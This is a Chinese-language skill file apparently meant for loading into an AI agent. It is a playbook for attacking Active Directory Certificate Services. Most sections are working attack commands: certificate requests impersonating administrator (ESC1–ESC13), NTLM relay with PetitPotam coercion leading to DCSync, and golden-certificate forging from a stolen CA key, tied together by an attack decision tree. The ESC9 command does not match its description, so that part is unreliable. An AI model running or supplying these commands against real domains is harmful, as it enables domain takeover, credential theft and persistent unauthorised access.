# 技能：AD CS 攻击手册 — 专家指南

> **AI 加载指令**：专家级 AD CS（活动目录证书服务）攻击技巧。涵盖 ESC1 至 ESC13，基于证书的持久化、NTLM 中继到注册端点以及 CA 配置错误。基础模型会忽略注册先决条件链和 ESC 条件组合。

## 0. 相关路由

在深入之前，请考虑加载：

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) 用于基于 ACL 的攻击，该攻击可启用 ESC4（模板修改）
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) 用于在获取证书后使用 Kerberos 技术
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) 用于 ESC8（中继到 HTTP 注册端点）
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) 用于使用获取的证书进行横向移动

### 高级参考

当您需要以下内容时，请加载 [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md)：

- 带有条件、影响和工具命令的 ESC1–ESC13 快速参考表
- 每个ESC变体的单行利用命令
- 每个技术的检测指标

---

## 1. AD CS 架构概述

```
证书颁发机构 (CA)
│
├── 企业 CA（AD 集成，基于模板颁发证书）
│   ├── 证书模板（定义谁可以注册、哪些 EKU、主题设置）
│   ├── 注册端点：HTTP (certsrv)、RPC、DCOM
│   └── 在 AD 中发布：CN=公钥服务,CN=服务,CN=配置
│
├── 模板密钥设置：
│   ├── 主题备用名称 (SAN)：证书代表谁
│   ├── 扩展密钥用途 (EKU)：证书允许什么
│   ├── 注册权限：谁可以请求
│   └── 颁发要求：管理员批准、授权签名
│
└── 证书 → Kerberos 认证流程：
    用户提交证书 → PKINIT → KDC 验证 → 颁发 TGT
```

---

## 2. 列出信息

```bash
# Certipy（推荐 — 全面）
certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable -stdout

# Certify（从 Windows）
Certify.exe find
Certify.exe find /vulnerable
Certify.exe cas                    # 列出 CA

# 手动 LDAP 查询模板
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=证书模板,CN=公钥服务,CN=服务,CN=配置,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

---

## 3. ESC1 — 注册者提供主题

**条件**：模板允许注册者指定主题备用名称 (SAN) + 客户端认证 EKU + 低权限注册。

```bash
# Certipy
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Certify (Windows)
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# 使用证书进行认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → administrator 的 NT 哈希
```

---

## 4. ESC2 — 任何用途 EKU

**条件**：模板具有“任何用途”EKU 或无 EKU（从属 CA 证书）+ 低权限注册。

```bash
# 与 ESC1 利用相同
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template AnyPurposeTemplate -upn administrator@domain.com
```

---

## 5. ESC3 — 注册代理

**条件**：模板允许注册代理证书 + 另一个模板允许代表他人注册。

```bash
# 第一步：请求注册代理证书
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template EnrollmentAgent

# 第二步：使用注册代理证书代表管理员请求
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template UserTemplate -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

# 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 6. ESC4 — 模板 ACL 配置错误

**条件**：低权限用户对证书模板对象具有写入权限。

```bash
# 修改模板使其成为 ESC1 可利用
# 使用 Certipy：
certipy template -u user@domain.com -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP

# 模板现在是 ESC1 → 作为 ESC1 进行利用
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# 恢复原始模板（清理）
certipy template -u user@domain.com -p password -template VulnTemplate \
  -configuration old_config.json -dc-ip DC_IP
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**条件**：CA 启用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志 → 任何模板都成为 ESC1。

```bash
# 检查标志是否设置
certutil -config "CA_HOST\CA-NAME" -getreg policy\EditFlags

# 利用：请求任何带有 SAN 的模板
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template User -upn administrator@domain.com
```

---

## 8. ESC7 — CA 官员 / 管理员权限

**条件**：用户在 CA 上具有 ManageCA 或 ManageCertificates 权限。

```bash
# 具有 ManageCA：启用 SubCA 模板（始终允许 SAN）
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -enable-template SubCA

# 请求 SubCA 证书，使用管理员 SAN（将被拒绝 — “待处理”）
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template SubCA -upn administrator@domain.com

# 具有 ManageCertificates：批准待处理请求
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -issue-request REQUEST_ID

# 检索颁发的证书
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -retrieve REQUEST_ID
```

---

## 9. ESC8 — NTLM 中继到 HTTP 注册

**条件**：CA 具有HTTP注册端点（certsrv）且未强制 HTTPS。

```bash
# 设置中继到注册端点
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 强制 DC 认证（PetitPotam、PrinterBug 等）
PetitPotam.py RELAY_HOST DC01.domain.com

# DC 认证 → 中继 → 颁发证书给 DC01$
# 使用证书进行认证
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → DC01$ 哈希 → DCSync
```

---

## 10. ESC9-ESC13 — 新发现

### ESC9：无安全扩展（StrongCertificateBindingEnforcement = 0/1）

弱证书映射允许在 `CT_FLAG_NO_SECURITY_EXTENSION` 设置时进行模拟。

```bash
# 修改受害者的 UPN 为管理员，请求证书，再改回
certipy shadow auto -u attacker@domain.com -p pass -account victim -dc-ip DC_IP
```

### ESC10：弱证书映射（基于注册表）

与 ESC9 类似，但利用 DC 上的 `CertificateMappingMethods` 注册值。

### ESC11：NTLM 中继到 RPC 注册

中继 NTLM 到 CA 的 RPC 接口（IF_ENFORCEENCRYPTICERTREQUEST 未设置）。

```bash
ntlmrelayx.py -t "rpc://CA_HOST" -rpc-mode ICPR -icpr-ca-name "CA-NAME" \
  -smb2support --adcs --template DomainController
```

### ESC13：OID 组链接（颁发策略）

模板的颁发策略 OID 链接到一个组 → 证书授予该组成员资格。

```bash
certipy req -u user@domain.com -p pass -ca CA-NAME -target CA_HOST \
  -template ESC13Template
# 证书授予链接组的成员资格
```

---

## 11. 基于证书的持久化

### 金色证书

使用 CA 私钥 → 伪造任何证书。

```bash
# 提取 CA 私钥（需要 CA 服务器的管理员权限）
certipy ca -backup -u admin@domain.com -p password -ca CA-NAME -target CA_HOST

# 伪造任何用户的证书
certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# 使用伪造的证书进行认证
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

**持久化**：有效期为 CA 证书过期或 CA 私钥轮换。

### ForgeCert（Windows）

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" --Subject "CN=User" \
  --SubjectAltName "administrator@domain.com" --NewCertPath forged.pfx --NewCertPassword "pass"
```

---

## 12. AD CS 攻击决策树

```
针对 AD CS
│
├── 列出信息：certipy find -vulnerable
│
├── 发现可利用模板？
│   ├── 注册者可以设置 SAN + 客户端认证 EKU？
│   │   └── ESC1 → 请求带有管理员 UPN 的证书（§3）
│   ├── 任何用途 EKU？
│   │   └── ESC2 → 与 ESC1 相同（§4）
│   ├── 可用注册代理模板？
│   │   └── ESC3 → 注册为代理，然后代表他人（§5）
│   └── 颁发策略中的 OID 组链接？
│       └── ESC13 → 请求证书以获取组成员资格（§10）
│
├── 对模板有写入权限？
│   └── ESC4 → 修改模板为 ESC1 条件（§6）
│
├── CA 配置错误？
│   ├── EDITF_ATTRIBUTESUBJECTALTNAME2 标志？
│   │   └── ESC6 → 任何模板都成为 ESC1（§7）
│   ├── ManageCA / ManageCertificates 权限？
│   │   └── ESC7 → 启用 SubCA 模板，批准请求（§8）
│   └── HTTP 注册未强制 HTTPS？
│       └── ESC8 → NTLM 中继到 certsrv（§9）
│
├── DC 上存在弱证书映射？
│   ├── StrongCertificateBindingEnforcement < 2？
│   │   └── ESC9 → UPN 操作 + 证书请求（§10）
│   └── CertificateMappingMethods 配置错误？
│       └── ESC10 → 类似 UPN 滥用（§10）
│
├── RPC 注册未加密？
│   └── ESC11 → NTLM 中继到 RPC（§10）
│
└── 已是 CA 管理员？
    └── 金色证书用于持久化（§11）
```
